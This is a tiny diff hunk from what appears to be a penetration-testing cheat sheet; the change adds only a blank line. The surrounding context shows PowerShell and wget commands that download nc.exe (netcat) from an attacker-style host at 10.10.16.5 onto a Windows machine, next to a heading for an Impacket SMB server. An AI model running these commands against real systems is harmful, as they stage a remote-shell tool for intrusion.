@@ -146,6 +146,7 @@ https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-pro
 ``powershell Invoke-WebRequest -Uri http://10.10.16.5:80/nc.exe -OutFile C:\Users\Public\Downloads\nc.exe``
 
 -----------WGET------------------
+
 ``wget "http://10.10.16.5:80/nc.exe" -outfile "nc.exe"``
 
 -----------SMBSERVER-IMPACKET------------------
